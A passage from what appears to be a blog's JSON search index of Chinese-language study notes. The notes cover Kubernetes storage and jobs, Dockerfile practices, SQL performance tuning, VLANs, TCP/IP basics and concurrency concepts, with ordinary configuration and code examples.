metadata: name: compute-resources spec: hard: requests.cpu: \u0026#34;1\u0026#34; requests.memory: 1Gi limits.cpu: \u0026#34;2\u0026#34; limits.memory: 2Gi requests.nvidia.com/gpu: 4 --- apiVersion: v1 kind: ResourceQuota metadata: name: object-counts spec: hard: configmaps: \u0026#34;10\u0026#34; persistentvolumeclaims: \u0026#34;4\u0026#34; pods: \u0026#34;4\u0026#34; replicationcontrollers: \u0026#34;20\u0026#34; secrets: \u0026#34;10\u0026#34; services: \u0026#34;10\u0026#34; services.loadbalancers: \u0026#34;2\u0026#34; 角色控制 Role是指定在一個namespace下可以操作的資源 ClusterRole是在任何namespace下都可以操作的資源\n資源是在不同的apigroup下\n用rolebinding把Role與user或group或service account綁在一起\n儲存 在 使用檔案 之前我們需要 filesystem 在 使用filesystem 之前我們需要 做partition 在 做partition 之前我們需要 硬碟\nfilesystem 就是 volumne 做partition 就是 PersistentVolumeClaim 虛擬的硬碟(有特別的屬性) 就是 Storage Class 實體的硬碟 就是 Persistent Volume (docker的volumne)\n這裡就轉貼一些別人的範例\nkind: StorageClass apiVersion: storage.k8s.io/v1 metadata: name: standard provisioner: kubernetes.io/aws-ebs parameters: type: gp2 zone: us-west-2 reclaimPolicy: Delete # [Delete | Retain] apiVersion: v1 metadata: name: myclaim spec: accessModes: - ReadWriteOnce # [ReadWriteOnce | ReadOnlyMany | ReadWriteMany] resources: requests: storage: 8Gi storageClassName: standard # Ref apiVersion: v1 kind: Pod metadata: name: apiserver labels: app: apiserver tier: backend spec: containers: - name: my-pod image: zxcvbnius/docker-demo ports: - containerPort: 3000 volumeMounts: # \\/ 看下面的volumes - name: my-pvc mountPath: \u0026#34;/tmp\u0026#34; volumes: - name: my-pvc persistentVolumeClaim: claimName: myclaim # Ref Persistent Volume的例子 (注意到在這裡PVC沒有指定storageClassName，PVC直接從PV拿)\napiVersion: v1 kind: PersistentVolume \u0026lt;=== 指定物件種類為 PV metadata: name: pv001\t\u0026lt;=== PV 名稱 spec: capacity: storage: 2Gi \u0026lt;=== 指定大小 accessModes: - ReadWriteOnce \u0026lt;=== 指定存取模式 hostPath: \u0026lt;=== 綁定在 host 的 /tmp 目錄 path: /tmp --- apiVersion: v1 kind: Pod \u0026lt;=== 使用一個 Pod 並試著掛載 Volume metadata: name: pvc-nginx spec: containers: - name: nginx image: nginx ports: - containerPort: 80 volumeMounts: \u0026lt;=== 將名為 volume-pv 的 Volume 掛載到 /usr/share/nginx/html 目錄底下 - name: volume-pv mountPath: /usr/share/nginx/html volumes: - name: volume-pv \u0026lt;=== 宣告一個名為 volume-pv 的 Volume 物件 persistentVolumeClaim: \u0026lt;=== 綁定名為 pv-claim 的 PVC 物件 claimName: pv-claim --- kind: PersistentVolumeClaim apiVersion: v1 metadata: name: pv-claim spec: accessModes: - ReadWriteOnce resources: requests: storage: 1Gi \u0026lt;=== 要求 1G 容量 filesystem只能從硬碟開始嗎? 沒有現成的嗎?\n有，\n實體主機的檔案 (emptyDir, hostPath) NFS apiVersion: v1 kind: Pod metadata: name: apiserver spec: containers: - name: apiserver image: zxcvbnius/docker-demo volumeMounts: - mountPath: /tmp name: tmp-volume imagePullPolicy: Always volumes: - name: tmp-volume hostPath: path: /tmp - name: nfs-volumes nfs: server: {YOUR_NFS_SERVER_URL} path: / type: Directory - name: cache-volume emptyDir: {} 從剛剛的資料來源來看可分成\n網路: NFS、Storage Class\u0026amp;PersistentVolumeClaim 實體主機: emptyDir、hostPath 哪虛擬主機有沒有自己的檔案(資料)? 有，ConfigMap 與 Secret\n不過因為secret是放秘密的資料 所以也會透過env var傳\n要注意到ConfigMap 與 Secret都是hash table， 也就是用key去取值\napiVersion: v1 kind: Pod metadata: name: apiserver labels: app: webserver tier: backend spec: containers: - name: nodejs-app image: zxcvbnius/docker-demo ports: - containerPort: 3000 - name: nginx image: nginx:1.13 ports: - containerPort: 80 volumeMounts: - name: nginx-conf-volume mountPath: /etc/nginx/conf.d env: - name: SECRET_USERNAME valueFrom: secretKeyRef: name: demo-secret-from-yaml key: username - name: SECRET_PASSWORD valueFrom: secretKeyRef: name: demo-secret-from-yaml key: password volumes: - name: nginx-conf-volume configMap: name: nginx-conf items: - key: my-nginx.conf path: my-nginx.conf - name: secret-volume secret: secretName: demo-secret-from-yaml 只想跑某個指令 只跑一次: Job apiVersion: batch/v1 kind: Job metadata: name: pi spec: template: spec: containers: - name: pi image: perl command: [\u0026#34;perl\u0026#34;, \u0026#34;-Mbignum=bpi\u0026#34;, \u0026#34;-wle\u0026#34;, \u0026#34;print bpi(2000)\u0026#34;] restartPolicy: Never backoffLimit: 4 也可以平行跑，見官方文件\n反覆: CronJob apiVersion: batch/v1beta1 kind: CronJob metadata: name: hello spec: schedule: \u0026#34;*/1 * * * *\u0026#34; jobTemplate: spec: template: spec: containers: - name: hello image: apline args: - /bin/sh - -c - echo \u0026#34;Hi, current time is $(date)\u0026#34; restartPolicy: OnFailure Ref Job NodePort\u0026amp;Loadbalancer 官網 30天鐵人賽 go-template\n","permalink":"https://littlebees.github.io/2020/08/k8s%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e突然想起有k8s，就來看看\n越看越像linux主機的抽象化，最後變成近乎linux主機的framework\u003c/p\u003e","title":"k8s筆記"},{"content":"動機 看看寫Dockerfile的注意事項\n目標 減小Image的大小 盡量使用cache 讓環境一致 COPY或RUN一次就會多一層layer，所以 把可以整合在同一句的RUN整合在同一句 Before\nRUN apt update RUN apt install -y ... After\nRUN apt update \u0026amp;\u0026amp; apt install -y ... 只COPY需要的東西 Before\nCOPY . /app After\nCOPY file1 file2 ... /app 把不常變動的放前面 只要docker看到這句的cache失效 就會把後面的所有指令都重跑一遍 Before\nCOPY file1 file2 ... /app RUN apt update \u0026amp;\u0026amp; apt install -y ... After\nRUN apt update \u0026amp;\u0026amp; apt install -y ... COPY file1 file2 ... /app 減少cache，只放真的需要的東西 移除不需要的dep \u0026amp; 清除apt快取 Before\nRUN apt update \u0026amp;\u0026amp; apt install -y ... vim After\nRUN apt update \u0026amp;\u0026amp; apt install -y --no-install-recommends ... \u0026amp;\u0026amp; rm -rf /var/lib/apt/lists/* COPY file1 file2 ... /app 讓環境一致 如果有現成的就直接用，同時指定版本 Before\nRUN apt update \u0026amp;\u0026amp; apt install -y openjdk8 vim After\nFROM openjdk:8 COPY file1 file2 ... /app 剛剛好的權限 直接看例子\nFROM maven:3.6.3-jdk-11 AS builder WORKDIR /workdir/server COPY pom.xml /workdir/server/pom.xml RUN mvn dependency:go-offline RUN mvn package FROM openjdk:11-jre-slim RUN addgroup -S java \u0026amp;\u0026amp; adduser -S javauser -G java USER javauser EXPOSE 8080 COPY --from=builder /workdir/server/target/project-0.0.1-SNAPSHOT.jar /project-0.0.1-SNAPSHOT.jar CMD [\u0026#34;java\u0026#34;, \u0026#34;-Djava.security.egd=file:/dev/./urandom\u0026#34;, \u0026#34;-jar\u0026#34;, \u0026#34;/project-0.0.1-SNAPSHOT.jar\u0026#34;] 區分不同的step(就是替dockerfile抽象) multi-stege build (Docker 17.05後) FROM openjdk:8 AS builder ... FROM openjdk:8-jre-alpine COPY --from=builder file1 file2 /app CMD [\u0026#34;java\u0026#34;, \u0026#34;-jar\u0026#34;, \u0026#34;/app/app.jar\u0026#34;] 這個其實就是在一般PL會看到的副程式\n不過因為Dockerfile沒有控制結構(條件判斷與迴圈) 所以沒有重複呼叫某塊code產生資料的需要 只要跑完要的資料就會在image中 因此只要有辦法碰到需要的Image就好 所以才有這種東西\n不只是用自己的image，用其他的image也是ok的\nCOPY --from=nginx:latest /etc/nginx/nginx.conf /nginx.conf 只想build到某一層的Image也沒問題\ndocker build --target builder -t alexellis2/href-counter:latest . Ref source1 source2 multi-stege build\n","permalink":"https://littlebees.github.io/2020/08/dockerfile%E7%9A%84%E6%9C%80%E4%BD%B3%E5%AF%A6%E8%B8%90%E6%95%B4%E7%90%86/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e看看寫Dockerfile的注意事項\u003c/p\u003e","title":"dockerfile的最佳實踐整理"},{"content":"動機 這裡是研究(自己的觀察與猜測)dockerfile的語意啦\ndocker的container就是應用程式 只不過每個container都有自己的\n網路空間 儲存空間 ENTRYPOINT \u0026amp; CMD 一般在網路上會看到ENTRYPOINT \u0026amp; CMD在不同form下會有不同的效果 在官方文件上有以下的表格\n| | No ENTRYPOINT | ENTRYPOINT exec_entry p1_entry | ENTRYPOINT [“exec_entry”, “p1_entry”] | | ************************** | ************************** | ****************************** | ********************************************** | | No CMD | error, not allowed | /bin/sh -c exec_entry p1_entry | exec_entry p1_entry | | CMD [“exec_cmd”, “p1_cmd”] | exec_cmd p1_cmd | /bin/sh -c exec_entry p1_entry | exec_entry p1_entry exec_cmd p1_cmd | | CMD [“p1_cmd”, “p2_cmd”] | p1_cmd p2_cmd | /bin/sh -c exec_entry p1_entry | exec_entry p1_entry p1_cmd p2_cmd | | CMD exec_cmd p1_cmd | /bin/sh -c exec_cmd p1_cmd | /bin/sh -c exec_entry p1_entry | exec_entry p1_entry /bin/sh -c exec_cmd p1_cmd |\n來觀察一下在不同的form下會有什麼差別\nexec form: 沒有/bin/sh -c shell form: 有/bin/sh -c\n所以shell form就是一種macro會自己加上/bin/sh -c\n故想像成在terminal打指令 exec form: 直接打在terminal shell form: 先加上/bin/sh -c，在打到terminal\n那再回來看ENTRYPOINT \u0026amp; CMD 其實ENTRYPOINT \u0026amp; CMD就是\n分別展開ENTRYPOINT與CMD的指令再append起來再送到terminal執行\nARG \u0026amp; ENV 再來看ARG與ENV的scope\nARG是build的參數，所以只能在RUN的時候看到 ENTRYPOINT與CMD都看不到\nENV就都看的到\nexec form \u0026amp; shell form 那執行期時ARG與ENV在exec form與shell form有什麼不同嗎? 直接跑跑看!!\nSending build context to Docker daemon 2.048kB Step 1/9 : FROM alpine latest: Pulling from library/alpine df20fa9351a1: Pull complete Digest: sha256:185518070891758909c9f839cf4ca393ee977ac378609f700f60a771a2dfe321 Status: Downloaded newer image for alpine:latest ---\u0026gt; a24bb4013296 Step 2/9 : ARG hi=1 ---\u0026gt; Running in 81dac0cde5c5 Removing intermediate container 81dac0cde5c5 ---\u0026gt; 0a224d4f46ce Step 3/9 : ENV wow=2 ---\u0026gt; Running in 6c54e59b4201 Removing intermediate container 6c54e59b4201 ---\u0026gt; 6a008ef31f84 Step 4/9 : RUN echo $hi ---\u0026gt; Running in 69eec389ae0d 1 Removing intermediate container 69eec389ae0d ---\u0026gt; a025a3789730 Step 5/9 : RUN [\u0026#34;echo\u0026#34;, \u0026#34;$hi\u0026#34;] ---\u0026gt; Running in ecf7cc563edf $hi Removing intermediate container ecf7cc563edf ---\u0026gt; c3f8c7e3d843 Step 6/9 : RUN echo $wow ---\u0026gt; Running in 0a47051aeaa0 2 Removing intermediate container 0a47051aeaa0 ---\u0026gt; f0ec803da2d4 Step 7/9 : RUN [\u0026#34;echo\u0026#34;, \u0026#34;$wow\u0026#34;] ---\u0026gt; Running in 7b443431db18 $wow Removing intermediate container 7b443431db18 ---\u0026gt; 91902d5a74b1 Step 8/9 : RUN [\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;echo\u0026#34;, \u0026#34;$hi\u0026#34;] ---\u0026gt; Running in 865729798cb8 Removing intermediate container 865729798cb8 ---\u0026gt; e709f7ba52dd Step 9/9 : RUN [\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;echo\u0026#34;, \u0026#34;$wow\u0026#34;] ---\u0026gt; Running in 9897c8732ca2 Removing intermediate container 9897c8732ca2 ---\u0026gt; aaa72c558553 Successfully built aaa72c558553 如果用exec form，不會置換， shell form會置換\n所以只有shell form才會看到Dockerfile的變數 但exec form根本看不到\n所以可以對shell form與exec form下一個結論 shell form是統一跑在Dockerfile自己開的shell(像/bin/sh) exec form就是直接用像是execl之類的東西直接去跑，把所有東西當成字串\n那麼應該可以猜shell的展開大概會像\nenvs = \u0026#34;\u0026#34; for (k,v) in ENVS: # env的所有pair，與arg的pair(如果可以的話) envs += \u0026#34;{}={} \u0026#34;.format(k,v) return \u0026#34;/bin/sh -c {} {CMD}\u0026#34;.format(envs,cmd) exec的話就是\nsystem(\u0026#39; \u0026#39;.join(input_array)) 等等，那為什麼CMD可以執行指令，在沒有ENTRYPOINT的時候 如果沒有ENTRYPOINT就可以看成\n\u0026quot;\u0026quot; + \u0026lt;expanded CMD\u0026gt;\n自然就有CMD作為指令執行的效果\n等等，那為什麼ENTRYPOINT的shell form會忽略CMD?? 如果兩邊都是shell form，兩邊展開就是\n/bin/sh -c ... /bin/sh -c ...\n但是實際上CMD不會執行指令，他只是展開與ENTRYPOINT接在一起 這樣不符合shell form會執行指令的預期就擋掉了\n2 phases 前面看了這麼多，可以看出Dockerfile有兩個階段\nbuild phase: 生成Image的時候，ARG+RUN+ENV run phase: 跑container的時候，ENTRYPOINT+CMD+ENV Ref 官方文件\n","permalink":"https://littlebees.github.io/2020/08/dockerfile%E7%9A%84%E7%94%A8%E6%B3%95/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這裡是研究(自己的觀察與猜測)dockerfile的語意啦\u003c/p\u003e\n\u003cp\u003edocker的container就是應用程式\n只不過每個container都有自己的\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e網路空間\u003c/li\u003e\n\u003cli\u003e儲存空間\u003c/li\u003e\n\u003c/ol\u003e","title":"dockerfile的用法"},{"content":"動機 Ref的文章看起來很有趣，還沒看過用這種方式探討PL的 所以就寫下自己的心得了\nCOBOL 記憶體就是一層又一層的嵌套 而記憶體就是這些不會變大也不會變小\n就是C中的struct、union、array\n控制可見度 大家都在同一塊地方，沒辦法控制可見度\n如何access 因為只有primitive type所以用算的去看offset\n序列化 都只有固定長度，所以容易序列化\nLISP 只有pointer\n十分的靈活\n但\n需要GC 容易type error 要管理pointer 占用大量記憶體 控制可見度 有pointer才能access，可見度很好控管\n如何access 用pointer一路走過去\n序列化 序列化不容易做，想想cycle-reference要怎麼辦? 如果有共用的部分要怎麼處理?\nFORTRAN 世界只剩下array\n有點像COBOL的折衷，因為可以用array的格子來表示結構或是union 但是不同於COBOL我們可以有很多塊array\n控制可見度 因為array可以拆成好幾份，來保持不同的可見度\n如何access array加index\n序列化 序列化容易做\n其他 Pipe 當世界只剩下queue\n有點像FORTRAN但是沒有index\n這個Model經常用在concurrent上，可以看go的channel或是pi calculus\nFile\u0026amp;folder 有點像LISP但是\n只能是tree(所有有分leaf與node) 只有leaf才能放資料 如何表示attribute folder+many files (ex: /proc//)\nSQL 基本上就是COBOL加LISP key是pointer column從COBOL來 每次select都是新的matrix(FORTURN)\nRef The memory models that underlie programming languages 编程语言中的 6 种内存模型\n","permalink":"https://littlebees.github.io/2020/08/memory-model/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eRef的文章看起來很有趣，還沒看過用這種方式探討PL的\n所以就寫下自己的心得了\u003c/p\u003e","title":"memory model"},{"content":"動機 很多時候會需要把一些trace或是測試的程式放到舊平台或是其他平台運行 所以記一下遇過的坑\n坑: shared object 就是在/usr/lib的so\n第一個情境是怎麼找需要的so? 用ldd\n第二個是如果他需要的版本比較舊的話? 用symbol link，但是要注意不要動到重要的so， 像c的runtime(libc)\n第三個是so放哪? 一個是/usr/lib 不然就是用LD_LIBRARY_PATH 像這樣\nLD_LIBRARY_PATH=\u0026#34;/path/you/want1:/path/you/want/2\u0026#34; ./a.out 坑: compile 如果真的只能compile，要注意當時的環境 最好用當時compiler的版本\n通常用新compiler去編舊程式都會報錯 大多時候都是像type對不起來的問題 但處理起來很煩\n寫在後面 順便記一下好用的trace工具\nstrace: 追userspace程式的system call pstack: 追call stack systemtap: 追kernel的function call Ref good chinese linux tool refbook\n","permalink":"https://littlebees.github.io/2020/08/%E5%A5%87%E8%81%9E%E8%BB%BC%E4%BA%8B-%E6%8A%8A%E7%A8%8B%E5%BC%8Fport%E5%88%B0%E5%85%B6%E4%BB%96%E6%88%96%E8%88%8A%E5%B9%B3%E5%8F%B0%E9%81%8B%E8%A1%8C/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e很多時候會需要把一些trace或是測試的程式放到舊平台或是其他平台運行\n所以記一下遇過的坑\u003c/p\u003e","title":"奇聞軼事 - 把程式port到其他或舊平台運行"},{"content":"動機 兩條thread對兩個socket fd做讀寫(一讀一寫、一寫一讀)，等另外一邊結束後 另一條thread沒辦法結束join\n原因 另一條沒辦法結束的thread卡在write上\n沒有任何報錯就是卡在write一直不跳出去 (感覺是kernel的錯，用一般原始的kernel就沒事)\n明明fd都關了另一邊卻看不到，感覺遇到了可見性問題\n根據查的資料，close沒有thread-safe\n解法 用cond var，來通知main thread把另一條砍掉\n坑: transfer of control bypasses initialization of 如果用cpp11的cond var，加上goto，就會有這個錯誤 用pthread的cond var就ok了\n查看程式開的fd cat /proc/\u0026lt;pid\u0026gt; 寫在後面 如果用message passing，而不是用2條thread去做會不會比較好 這樣thread就不用負擔管理fd的任務\nRef close-thread-safe\n","permalink":"https://littlebees.github.io/2020/08/%E5%A5%87%E8%81%9E%E8%BB%BC%E4%BA%8B-%E6%AD%BB%E6%8E%89%E7%9A%84write/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e兩條thread對兩個socket fd做讀寫(一讀一寫、一寫一讀)，等另外一邊結束後\n另一條thread沒辦法結束join\u003c/p\u003e","title":"奇聞軼事 - 死掉的write"},{"content":"動機 sql的效能議題好像不常被提起 十分niche 那就來整理看看\n原則 優先序由上往下\n用index過的所有column(也只有被index過的)去select 如果需要反覆存取的資料上index與放到temp table 壓低要做操作的資料量 真的要用select *嗎? 通常不會需要所有的column，選需要的出來就好\n避免用distinct 如果可以就select更多column出來就好\n用join去join，不要用where去做 如果用where去做就是cross join，會讓資料量變大 效率自然就下去了\n能用where去過濾的就用where having只用在aggregate function的過濾\n從sql的執行順序來看，因為where會先把資料量壓小 所以可以的話把條件放在where\nwildcard只用在pattern最後面，如果只比對開頭的字串的話 是合理啦\n但如果是要最尾的話，只放wildcard在前面效能也話比較好嗎\n用limit(或top,FETCH FIRST，看DBMS)限制query出的數目，尤其是只想看個大概的時候 limit在sql的執行順序不是最高的，但是sql engine會知道不用撈整個table 這樣可以把資料量往下壓\n把outer join換成空值+inner join 原本outer join會在不存在的column留下null 可以把null換成某個空值，這樣就可以用inner join\n像是下面表的NO CUSTOMER\nCUSTOMER_ID CUSTOMER_NAME 0 NO CUSTOMER 1 John Doe 2 Mary Jane 3 Peter Pan 4 Joe Soap CUSTOMER_ID SALES_PERSON 0 Newbee Smith 2 Oldie Jones 1 Another Oldie 0 Greenhorn 把在join或是where中需要運算的部分放到row中 就是先算好\nBefore\nSELECT * FROM sales a JOIN budget b ON ((year(a.sale_date)* 100) + month(a.sale_date)) = b.budget_year_month After\nSELECT * FROM PRODUCTSFROM sales a JOIN budget b ON a.sale_year_month = b.budget_year_month avoid n+1 要select或是update等等 就直接用sql一次做完\n不要分成一次一個，DBMS不是記憶體，沒那麼快\nsubquery不要放在select的column中 這樣的話每一次select出新的row都要subquery一次 如下\nSELECT c.Name, c.City, (SELECT CompanyName FROM Company WHERE ID = c.CompanyID) AS CompanyName FROM Customer c 用join取代\nSELECT c.Name, c.City, co.CompanyName FROM Customer c LEFT JOIN Company co ON c.CompanyID = co.CompanyID 用exists來取代aggregate function，確認資料是否存在 Before\nIF (SELECT COUNT(1) FROM EMPLOYEES WHERE FIRSTNAME LIKE \u0026#39;%JOHN%\u0026#39;) \u0026gt; 0 PRINT \u0026#39;YES\u0026#39; After\nIF EXISTS(SELECT FIRSTNAME FROM EMPLOYEES WHERE FIRSTNAME LIKE \u0026#39;%JOHN%\u0026#39;) PRINT \u0026#39;YES\u0026#39; 如果一行做不完，用temp table存 如下\nSELECT * INTO #Temp FROM Customer WHERE RegionID = 5 SELECT r.RegionName, t.Name FROM Region r JOIN #Temp t ON t.RegionID = r.RegionID 或是\ntable變數(根據soruce5，這個效能比較好)\nDECLARE @AAAA TABLE (\tA1\tINT IDENTITY(1,1) PRIMARY KEY, A2\tVARCHAR(128), A3\tVARCHAR(128) ) -- temp變數是這個 -- CREATE TABLE #AAAA -- (\tA1\tINT IDENTITY(1,1) PRIMARY KEY, -- A2\tVARCHAR(128), -- A3\tVARCHAR(128) -- ) Index Index哪些column Index完之後就不要一直改那些column的值 不然Btree是建心酸的嗎\n在where或是order by中用index過的column CREATE INDEX tbl_idx ON tbl (a, date_column) SELECT * FROM tbl WHERE a = 12 ORDER BY date_column DESC LIMIT 1 只有a與date_column在where與order by中，所以DBMS可以直接撈index的結果\nindex從左到右 CREATE INDEX tbl_idx ON tbl (a, b) SELECT * FROM tbl WHERE a = 38 AND b = 1 SELECT * FROM tbl WHERE b = 1 第二個select就吃不到index的好處因為第一個index是a\n只用index過的column CREATE INDEX tbl_idx ON tbl (a, date_column) SELECT date_column, count(*) FROM tbl WHERE a = 38 AND b = 1 GROUP BY date_column 因為b所以DBMS沒辦法從index過的結果拉資料，要去看table\n如何tuning Execution Plan Monitor Resource Usage SQL DMVs profiler SQL SYNTAX EXPLAIN Ref source1 source2 source3 source4 soruce5\n","permalink":"https://littlebees.github.io/2020/08/sql%E6%95%88%E8%83%BDsurvey/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003esql的效能議題好像不常被提起\n十分niche\n那就來整理看看\u003c/p\u003e","title":"sql效能survey"},{"content":"動機 想大概了解vlan到底是什麼\nLayer2 原本layer2，只要在同一台switch下大家都是一樣的 都在同一個廣播域下\n區分Layer2 如果想區分就要加個符號來識別 所以有了vlan tag\n排列組合 前提: 只有switch才對vlan tag做判斷\n封包: 有/無 tag port:\n在收的時候: 要不要幫打tag 要不要drop =\u0026gt; 符合 某個Tag 或是 在whitelist 中 在送的時候: 要不要把tag拿掉 (要變回原本的layer2封包) access, thunk, hybrid port port都有預設的vlan tag，幫沒有tag的封包打一個tag\naccess port就是對內的port，所以\n收的時候會看是不是自己這個廣播域的vlan tag 送出去時會把tag拿掉，就像原本的layer2 thunk port是與其他switch連接的port，所以\n收的時候會看是不是要處理的廣播域，也就是看tag是不是可以收的 送出去時只有在tag是自己的廣播域的tag時，會把tag拿掉，其他就保留 hybrid port基本上就是thunk port，但 即便是tag與自己廣播域的tag相同，也不會把tag拿掉\n","permalink":"https://littlebees.github.io/2020/08/vlan%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e想大概了解vlan到底是什麼\u003c/p\u003e","title":"vlan筆記"},{"content":"動機 那就來寫寫看說明文吧\n第一個問題也是最重要的問題是\n為什麼分那麼多層?\n接下去就是要說明這件事\n假設 基本上網路就是模擬人的溝通\n為了解釋需要大家的小小角色扮演\n新人\n我們什麼都不知道，都要去問人\n再來在任何一個情境下都有一個共通的任務\n把手上的食物(其他東西也可以啦)給Jane(其實是誰都Ok)\n假設Jane在任何情境下都存在\n情境:都在同一個房間大家都在做自己的事 在什麼都沒有與什麼都不知道的情況下\n我們要先找人，但要怎麼找?\n喊聲 =\u0026gt; Jane在不在\n之後就會有人舉手，我們再過去給他食物，補充血糖\n這與電腦關聯在哪?\n如果說另一台電腦網路線也接在同一台機器下(家中的接網路的機器的後面那一排網路孔)，只要廣播(broadcast)就會有人回答(reply)\n在同一台機器下就是Layer2，最常見的protocol是ethernet\n情境:大家都在做自己的事，但在不同房間 同樣什麼都不知道，但對方在不同房間 要怎麼知道Jane在哪?\n問人\n問誰?\n可能知道的人，像班導、主管、人源最好的人\n這樣我們就會知道Jane在哪個房間，就可以去那個房間 用剛剛提過的喊聲來找人，在把東西交出去\n這與電腦關聯在哪?\n當要溝通的電腦不在同一台機器上，就要去問某個人看有沒有可能得到答案\n現在電腦在不一樣的機器下，所以要去問人了\n這個人就是default gateway 因為房間與人名寫在一起，所以要有個分界，就叫subnet mask\n在不一樣的機器下就是Layer3，最常見的protocol是IP\n剛剛為了好想像，都是自己送東西過去 但實際上電腦都是把東西丟出去，交給可以轉送的人 而這樣就要在東西上寫下目的地與收件人，資料+轉送需要的資訊就是封包\n中場休息: 整個大概的流程是? 如果在同一台機器下就喊聲 如果不在同一台機器下就問人 (有注意到嗎? 問人也是要找同一房間的人，所以要先喊聲，再去問)\n這很好理解，但 如果不同房間都有Jane的話\u0026hellip;. 每次都要喊聲嗎? 是沒有筆可以記下來嗎? 要問的人是麼決定的? 要麼判斷是不是同一個房間? 第一個問題的回答 所以知道Jane這個名字是不夠的，要知道他在哪一個房間 所以有了新的識別方式，部門加名字，這就是IP IP分成網域與主機地址，都在IP address中\n這樣我們還要用Jane來識別嗎? 不是用部門+Jane來看就好? Jane是給同個房間的人看的 部門+Jane是給來自不同房間的人看的\n而且如果在房間內Jane是用綽號(像吃貨)稱呼但對外的名字還是可以用Jane阿\n所以會分層，會有Layer2的地址(MAC address)與Layer3(IP address)的地址\n第二個問題的回答 為什麼要喊聲? 因為我們不確定人在哪，他們沒有固定的位置\n要固定大家的位置，就是L2 switch 藉由背後的那些孔來對應到MAC address\n第三個問題的回答 所以自己要先知道這些資訊\n而這些資訊就叫routing table\n那怎麼會有L3 router(通常就叫router) 因為他知道不同的房間要怎麼走，他會有很多洞，分別到不同的房間\n所以通常router就是default gateway\n總結: 整個送的過程 從送的人開始\n包ip: 目標的ip 包mac: default gateway或是同房間的mac 丟出去 switch\n看mac決定要往那個孔丟 router\n看mac: 確定是要我收的 看ip比對routing table決定要往那個孔丟 目的地\n看mac: 確定是要我收的 看ip: 確定是要我收的 收下 TCP在哪? 把東西送到對方那邊是Layer2與Layer3的工作， 管理資料有沒有完整的送到就是TCP的其中一個工作\nTCP會要求對方收到封包時回送一個 說明我有收到的封包 確保對方有收到\nTCP還有另外兩個功能\n確保不要打爆對方 (你送太多了，我收不完) (Flow control) 確保不要打爆整個網路 (都給你送就好了啊) (Congestion control) TCP的三個功能又被稱為是 連線導向\nTCP為什麼要三段握手? 為什麼是3 要送資料前要先確保對方活著， 不論是server或是client都一樣要確認對方活著\n所以\nclient先送 \u0026lt;= client要確認server活著 server回 \u0026lt;= client知道server活著 server送 \u0026lt;= server要確認client活著 client回 \u0026lt;= server知道client活著 等等，這是4段阿!!\n仔細看，2與3 是不是都是server到client 把他們和在一起就是3段了\nTCP要關時為什麼是4段? 重點是對面要先斷，client才能關\n所以\nclient先送 server回 \u0026lt;= server開始準備關 server送 \u0026lt;= 通知client要關了 client回 \u0026lt;= 可以完全關掉了 等等，為什麼不能把2與3合起來? server要把tcp的資源釋放掉，所以要等不能馬上關\nUDP又是什麼 就是什麼保證或是管理都沒有，就是送就對了\n","permalink":"https://littlebees.github.io/2020/08/%E7%B6%B2%E8%B7%AF%E5%A6%82%E4%BD%95%E9%80%81%E8%B3%87%E6%96%99/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e那就來寫寫看說明文吧\u003c/p\u003e\n\u003cp\u003e第一個問題也是最重要的問題是\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e為什麼分那麼多層?\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e接下去就是要說明這件事\u003c/p\u003e","title":"網路如何送資料"},{"content":"動機 感覺自己不曾了解過Concurrent programming，所以來看這本 看能不能得到一些直覺\n共享變量的一致性 原子性: 在操作時變數的狀態不會被其他人改變 有序性: 指令產生的效果要照順序發生 (指令重排) 可見性: 別人改了其他地方看的到嗎? (快取問題) 要看Java Memory Model，會有更好的解釋 同時Java Memory Model也提出一些原則讓我們預期做Concurrent時會發生什麼事 並不限定在Java上他提出的原則是通用的\n隔離變數 隔離變數的手法\nlock, access in order =\u0026gt; 所有變數都在同一個地方 message passing(actor, CSP), copy data(copy-on-write) =\u0026gt; 變數在不一樣的地方 避免deadlock timeout then release =\u0026gt; live lock(deadlock doesn’t last forever, no progress is made either) allow interrupt check states before do something =\u0026gt; CAS(non-lock,atomic var), cond var avoiding alien method calls while holding a lock are applicable to any language with threads and locks\n如何形成deadlock def procA(): lockA.lock() ... lockB.lock() ... def procB(): lockB.lock() ... lockA.lock() ... 只要在一個瞬間能\n拿到對方想要的資源 (用圖來看就是對方的箭頭指向自己) 對方拿到自己想要的資源 (自己的箭頭指向對方) 沒有人願意放開手上的資源 這些資源都是唯一的只能一個proc持有 (圖的node只能有一個，我打前面三點的時候忘了這個) Priority inversion(打的時候想起來有讀過，但書上沒有) 高優先序的proc因為其他proc在critical zone而被block， 所以在context switch時讓其他優先序低的proc先執行了\n這裡要想到的是critical zone會讓所有用到的proc被綁在一起\n在context switch時所有用到critical zone的proc會被綁在一起 因為都要等critical zone\n所以可以看成在context switch時可以把proc分成 有/無critical zone\n那無critical zone的優先序就是原本的優先序 但有critical zone的優先序是正位於critical zone的proc的優先序\navoid lock 第二章中的第三天提到數字數的程式\n原本是只有一個counter從queue拿parser生出的task\n第二版把counter生出很多個counter想說可以提升效率 但因為counter們反覆access紀錄結果的map所以基本上沒辦法讓多個counter同時執行\n所以把map改成可以Concurrent的map，效率順利上升了\n第三版不在把所有counter的紀錄留在同一份map上 而是之後再一次加總完，效率又上去了\n就算是可Concurrent的map，但還是會有contention 還是會等(non-lock)\nSTM與atomic var與actor的比較 In addition to atoms, Clojure also provides agents and refs: • Atoms enable independent, synchronous changes to single values. (atomic var) • Agents enable independent, asynchronous changes to single values. (可以當成actor) • Refs enable coordinated, synchronous changes to multiple values. (STM)\nCSP 